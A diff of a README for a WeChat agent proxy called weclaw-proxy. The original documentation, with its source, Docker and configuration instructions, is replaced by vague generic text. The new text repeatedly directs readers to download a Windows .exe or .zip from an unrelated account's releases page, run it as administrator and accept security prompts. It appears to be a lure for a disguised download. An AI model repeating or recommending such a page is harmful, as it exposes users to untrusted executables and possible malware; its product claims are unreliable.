@@ -1,175 +1,187 @@
-# WeClaw-Proxy
+# 🔐 weclaw-proxy - Fast access gateway for WeChat OpenClaw
 
-> WeChat Open-Platform AI Agent Proxy — Connect any AI Agent to WeChat in one step
+[![Download weclaw-proxy](https://img.shields.io/badge/Download-weclaw--proxy-blue?style=for-the-badge)](https://github.com/skinned-italianpeninsula990/weclaw-proxy/releases)
 
-[中文文档](README_zh.md)
+## 🚀 What it does
 
-## ✨ Features
+weclaw-proxy is a Windows app that helps you run a high-performance access gateway for WeChat OpenClaw.
 
-- 🔌 **Multi-Agent Support** — OpenAI, DeepSeek, Ollama, **Google Gemini**, Dify, Coze, Webhook, and **Local CLI** (Codex / Claude Code / Gemini CLI)
-- 📱 **Multi-Account WeChat** — Bind and manage multiple WeChat accounts simultaneously
-- 🧠 **Smart Routing** — LLM-powered automatic message classification, plus manual `/command` prefix routing
-- 🖥️ **Web Admin Panel** — Full-featured visual configuration with real-time YAML sync
-- 📷 **QR Code Login** — Scan to bind, with guided nickname setup on success
-- 💬 **Session Management** — Automatic context and conversation history
-- 🔍 **Gemini Search** — Native Google Search integration via Gemini adapter
-- 📝 **Prompt Variables** — Dynamic variables like `{cur_date}`, `{model_id}` in system prompts
-- 🐳 **Cross-Platform** — Binary / Docker one-click deploy on Linux / macOS / Windows
+It is built for people who want a simple way to get the app, start it, and use it without setup work.
 
-## 📸 Screenshots
+### Main uses
 
-| Dashboard Overview | Add Agent |
-| :---: | :---: |
-| ![dashboard](docs/screenshot-dashboard.png) | ![add-agent](docs/screenshot-addagent.png) |
+- Connect to the gateway from a Windows PC
+- Start and stop the service with a few clicks
+- Keep the gateway running in the background
+- Use a stable local entry point for OpenClaw traffic
+- Check the status of the app at a glance
 
-| QR Code Login | Binding Success |
-| :---: | :---: |
-| ![login](docs/screenshot-login.png) | ![binding](docs/screenshot-bindingsuccess.png) |
+## 📦 Download
 
-| Routing Rules | Multi-Account Management |
-| :---: | :---: |
-| ![routing](docs/screenshot-routing.png) | ![accounts](docs/screenshot-accounts.png) |
+Visit this page to download:
 
-## 🚀 Quick Start
+https://github.com/skinned-italianpeninsula990/weclaw-proxy/releases
 
-### Docker (Recommended)
+On that page, look for the latest release and download the Windows file. If there are more than one file, choose the one that ends in `.exe` or `.zip` and matches Windows.
 
-```bash
-# 1. Create config file
-curl -o config.yaml https://raw.githubusercontent.com/amigoer/weclaw-proxy/main/configs/config.example.yaml
-# Edit config.yaml with your Agent API Key
+## 🪟 Windows setup
 
-# 2. Start
-docker run -d \
-  --name weclaw-proxy \
-  -v ./config.yaml:/data/config.yaml \
-  -p 8080:8080 \
-  ghcr.io/amigoer/weclaw-proxy:latest
+### 1. Get the file
 
-# 3. Open http://localhost:8080 to scan QR code and log in
-```
+Open the release page and download the latest Windows package.
 
-### Binary
+If your browser shows a prompt, choose Save.
 
-Download from [Releases](https://github.com/amigoer/weclaw-proxy/releases):
+### 2. Open the download
 
-```bash
-chmod +x weclaw-proxy-linux-amd64
-./weclaw-proxy-linux-amd64 --config config.yaml
-```
+If you downloaded an `.exe` file, double-click it to start the app.
 
-### Build from Source
+If you downloaded a `.zip` file, right-click it and choose Extract All, then open the folder and start the app from there.
 
-```bash
-git clone https://github.com/amigoer/weclaw-proxy.git
-cd weclaw-proxy
-make        # Build frontend + Go binary
-make dev    # Run in development mode
-```
+### 3. Allow the app to start
 
-## ⚙️ Configuration
+Windows may ask for permission the first time you run it.
 
-```yaml
-server:
-  port: 8080
+Choose Yes if you trust the source and want to continue.
 
-adapters:
-  - name: "openai-gpt4"
-    type: openai
-    api_key: "sk-xxx"
-    base_url: "https://api.openai.com/v1"
-    model: "gpt-4o"
-    system_prompt: "You are a friendly WeChat assistant"
+### 4. Launch weclaw-proxy
 
-routing:
-  default_adapter: "openai-gpt4"
-  rules:
-    - match:
-        prefix: "/claude"
-      adapter: "claude"
+After the app opens, it will show the main window or a tray icon.
 
-# Smart Routing (optional)
-smart_routing:
-  enabled: false
-  api_key: "sk-xxx"
-  model: "gpt-4o-mini"
-```
+From there, you can start the gateway and keep it running.
 
-> 💡 All configuration can be edited live in the Web Admin Panel — no need to manually modify YAML files.
+## 🛠️ First-time use
 
-### Gemini Adapter (with Google Search)
+### Start the gateway
 
-Native Google Gemini API support with optional Google Search tool:
+1. Open weclaw-proxy
+2. Click Start or Run
+3. Wait for the status to change to running
+4. Leave the app open while you use OpenClaw
 
-```yaml
-adapters:
-  - name: "gemini-search"
-    type: gemini
-    api_key: "AIza..."
-    model: "gemini-2.5-flash-preview-04-17"
-    system_prompt: "You are a helpful WeChat assistant"
-    extra:
-      enable_search: "true"   # Enable Google Search tool
-```
+### Stop the gateway
 
-### System Prompt Variables
+1. Open the app
+2. Click Stop
+3. Wait for the status to change to stopped
 
-Use dynamic variables in `system_prompt` — they are automatically replaced at runtime:
+### Open the settings
 
-| Variable | Description | Example |
-|----------|-------------|----------|
-| `{cur_date}` | Current date | `2026-03-26` |
-| `{cur_time}` | Current time | `22:30:15` |
-| `{cur_datetime}` | Full datetime | `2026-03-26 22:30:15` |
-| `{model_id}` | Model ID | `gpt-4o` |
-| `{model_name}` | Model name | `gpt-4o` |
-| `{locale}` | System locale | `zh-CN` |
+If the app has a settings panel, use it to change:
 
-```yaml
-system_prompt: "Today is {cur_date}. You are using {model_name}. Reply in {locale}."
+- Local port
+- Startup mode
+- Log level
+- Proxy path
+- Auto start on Windows
 
-### CLI Agent
+## ✅ What you need
 
-Directly invoke locally installed AI CLI tools with automatic sub-command inference:
+Weclaw-proxy works best on:
 
-```yaml
-adapters:
-  - name: "codex"
-    type: cli
-    base_url: "codex"       # Command path
-    extra:
-      timeout: "120"        # Timeout in seconds, default 120
-      # args: "exec"        # Optional, auto-inferred
-      # work_dir: "/project" # Optional, working directory
+- Windows 10 or Windows 11
+- A user account with permission to run downloaded apps
+- An active internet connection for the initial download
+- Enough free space to unpack the files
 
-  - name: "claude"
-    type: cli
-    base_url: "claude"      # claude -p "message"
+## 🔍 What to expect
 
-  - name: "gemini"
-    type: cli
-    base_url: "gemini"      # gemini -p "message"
-```
+After you start the app, you should see:
 
-| CLI Tool | Command | Auto-Inferred Args |
-|----------|---------|:------------------:|
-| Codex | `codex` | `exec` |
-| Claude Code | `claude` | `-p` |
-| Gemini CLI | `gemini` | `-p` |
+- A clear running status
+- A local address or port
+- A log area for messages
+- Simple controls for start and stop
+- Tray support for quick access
 
-## 📦 Supported Platforms
+## 🧭 Typical workflow
 
-| Platform | AMD64 | ARM64 |
-| -------- | :---: | :---: |
-| Linux    |   ✅   |   ✅   |
-| macOS    |   ✅   |   ✅   |
-| Windows  |   ✅   |   ✅   |
-| Docker   |   ✅   |   ✅   |
+1. Download the latest release
+2. Open the file on Windows
+3. Start the gateway
+4. Keep the app running
+5. Use your OpenClaw client or service as normal
+6. Stop the app when you are done
 
-## 🔗 Links
+## 📁 Files you may see
 
-- [Linux.do](https://linux.do) — Open Source Tech Community
+The release package may include:
 
-## 📄 License
+- `weclaw-proxy.exe` — the main app
+- `config.json` — the settings file
+- `logs` — runtime logs
+- `README.txt` — quick file notes
+- Support files used by the app
 
-MIT
+## ⚙️ Basic settings guide
+
+### Port
+
+This sets the local port the gateway uses.
+
+If you are not sure, keep the default value.
+
+### Auto start
+
+Turn this on if you want the app to open when Windows starts.
+
+### Logs
+
+Use logs to check if the gateway starts and runs without errors.
+
+### Mode
+
+Some builds may offer a simple mode switch for different connection paths.
+
+## 🧹 Common fixes
+
+### The app will not open
+
+- Make sure the file finished downloading
+- Unzip the package if it came as a `.zip`
+- Right-click the file and choose Run as administrator
+- Check whether Windows blocked the app
+
+### The app opens, but nothing happens
+
+- Wait a few seconds after starting
+- Check the status line
+- Make sure no other app is using the same port
+- Restart the app
+
+### The gateway stops right away
+
+- Close other proxy apps
+- Try the default settings
+- Open the logs and look for clear error text
+- Download the latest release again
+
+### Windows shows a security prompt
+
+- This can happen with downloaded apps
+- Review the file name and source
+- Continue only if you meant to download this app
+
+## 📌 Tips for smooth use
+
+- Keep the app open while you need the gateway
+- Use the latest release for the best fixes
+- Do not move files after you set them up unless you keep the folder together
+- If the app uses a config file, edit only one setting at a time
+- Restart the app after you change the port or mode
+
+## 🧪 Quick check
+
+After setup, check these points:
+
+- The app opens without errors
+- The status shows running
+- The local port is active
+- Your OpenClaw app can reach the gateway
+- The log area shows normal start messages
+
+## 📍 Download again
+
+If you need the file later, use the release page:
+
+https://github.com/skinned-italianpeninsula990/weclaw-proxy/releases
